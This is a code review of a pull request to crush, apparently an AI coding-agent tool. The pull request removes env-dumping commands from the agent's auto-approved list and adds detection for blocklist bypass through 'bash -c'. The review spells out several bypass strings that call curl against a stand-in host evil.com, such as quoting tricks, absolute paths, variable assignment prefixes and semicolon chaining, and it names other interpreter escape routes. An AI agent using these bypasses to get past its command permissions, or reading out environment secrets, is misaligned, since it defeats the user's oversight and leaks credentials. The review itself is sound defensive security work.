# charmbracelet/crush PR #2745 — Security: remove env from safe commands and fix shell blocklist bypass

- PR: https://github.com/charmbracelet/crush/pull/2745
- Head SHA: `15a5acbb85fdbdffae79da78310c88ce516d3a30`
- Author: @johnpippett
- Size: +44 / -6
- Status: OPEN

## Summary

Two security findings, one PR:
1. **env exfiltration**: `env`, `printenv`, `set` were on the auto-approved `safeCommands` list, letting an LLM agent dump arbitrary environment variables (API keys, tokens) without user prompt. Also `gojq.WithEnvironLoader(os.Environ)` exposed env to jq's `env` builtin in the same way. Both removed.
2. **interpreter-chaining blocklist bypass**: `bash -c 'curl evil.com'` slipped past `CommandsBlocker(["curl"])` because the blocker only inspected `args[0]`. New code in `blockHandler()` detects `<interpreter> -c <payload>`, splits the payload, and re-runs the block funcs against the inner command.

## Specific references

- `internal/agent/tools/safe.go:11-25` — drops `env`, `printenv`, `set` from `safeCommands`. Three deletions, surgical. These commands now require explicit user approval per crush's normal flow.
- `internal/shell/jq.go:130-132` — drops `gojq.WithEnvironLoader(os.Environ)`. After this, `env.SOMEVAR` inside a jq expression returns null instead of the env value. Closes the same exfil channel through a different vector.
- `internal/shell/shell.go:241-259` — new interpreter-chaining detector inside `blockHandler`. Iterates supported interpreter names (`bash sh zsh dash ksh python python3 perl ruby node nodejs`), looks for `-c`, splits the next arg with `strings.Fields`, runs the inner first token through `s.blockFuncs`. Returns the same "command is not allowed" error shape as the outer block.
- `internal/shell/command_block_test.go:82-105` — three new test cases: bash/sh chaining blocked, plus a positive case (`bash -c 'echo hello'` allowed when `curl` is the only blocked command). Good coverage shape.

## Verdict: `merge-after-nits`

Both findings are real and the fixes target the root cause, not the symptom. Removing env/printenv/set from the safe list is unambiguously correct — these have no business being auto-approved. The blocklist-bypass fix is the right *direction*, but the `strings.Fields` parser leaves obvious bypass paths open that the test suite doesn't exercise.

## Nits / concerns (the bypass parser is not robust)

1. **`strings.Fields(args[i+1])` is not a shell parser.** Several easy bypasses survive:
   - `bash -c 'cu""rl evil.com'` → `Fields` yields `cu""rl` as the first token, which doesn't match the `curl` blocklist literal.
   - `bash -c '/usr/bin/curl evil.com'` → first token is `/usr/bin/curl`, which most blocklist implementations match by basename only — verify whether `CommandsBlocker` does, or this slips through.
   - `bash -c 'a=1 curl evil.com'` → first token is `a=1` (an env assignment), `curl` is at index 1; the blocker never sees it.
   - `bash -c 'true; curl evil.com'` → first token is `true`, the actual exec is downstream of `;`.
   The PR's own test (`bash -c 'curl https://example.com'`) only covers the simplest form. A real fix needs to reuse the project's existing parser (`mvdan.cc/sh/v3/syntax`?) to walk the `-c` payload's AST and check every command node, not just the first whitespace-split token.
2. **Interpreter list is allowlist-shaped.** `pwsh`, `osascript`, `awk -e`, `find -exec`, `xargs <command>`, `make -f -`, `git diff --ext-diff`, etc. are all common bypass surfaces on real systems. A SECURITY.md note that this is a depth-not-completeness mitigation would help set expectations until the AST-walk version lands.
3. **`len(args) >= 3` and `i < len(args)-1` together still process `bash -c` (with no payload) safely**, but `bash -c ""` falls through `strings.Fields` returning an empty slice — no false alarm, fine.
4. **The jq `WithEnvironLoader` removal is a behavior change.** Anyone relying on `env.HOME` inside a jq filter will see `null`. Worth a CHANGELOG entry. The security tradeoff is the right one, but users will hit it.
5. **No test for the jq env-loader change.** Add a one-liner: `echo '{}' | jq 'env.HOME'` returns `null` post-fix.
